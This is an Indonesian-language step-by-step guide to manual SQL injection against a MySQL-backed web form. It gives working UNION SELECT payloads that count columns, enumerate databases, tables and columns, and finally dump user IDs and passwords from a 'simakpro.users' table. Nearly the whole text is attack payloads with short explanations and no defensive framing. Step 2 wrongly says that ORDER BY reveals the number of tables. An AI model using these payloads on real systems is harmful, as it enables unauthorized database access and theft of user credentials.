*Langkah-langkah melakukan SQL Injection secara manual*
1. Mencari tahu apakah inputan memiliki vuln untuk dilakukan sql injection dengan memasukan karakter ' atau " 
2. Apabila terdapat vuln, maka masukan script Cth: ' ORDER By 2# <- Script ini berguna untuk mengetahui jumlah tables dalam database.
3. Selanjutnya jika sudah diketahui banyaknya tables, makan jalankan script berikut, Cth:
' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#

4. Selanjutnya, untuk mengetahui user dan nama database yang digunakan menggunakan script berikut, Cth:
' UNION ALL SELECT 1,2,3,user(),5,6,7,database(),9,10#

5. Selanjutnya untuk mengetahui list database yang tersimpan pada MYSQL, menggunakan script berikut, Cth:
' UNION ALL SELECT 1,2,3,schema_name,5,6,7,8,9,10 FROM information_schema.schemata #

6. Selanjutnya, untuk mendapatkan list tables dari database tertentu, menggunakan script berikut, Cth:
' UNION SELECT 1,2,3,table_name,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema = 'simakpro' #

7. Selanjutnya, untuk mendapatkan informasi yang lebih spesifik kolom-kolom dari sebuah table, menggunakan script berikut, Cth:
' UNION SELECT 1,2,3,column_name,5,6,7,column_type,9,10 FROM information_schema.columns WHERE table_schema = 'simakpro'  AND table_name = 'users' #

8. Terakhir, untuk mendapatkan record data dalam table yang dipilih, menggunakan script berikut, Cth:
' UNION SELECT 1,2,3,CONCAT(usrid,' - ',passwd,' - ',level, ' - ', type_user),5,6,7,8,9,10 FROM simakpro.users #
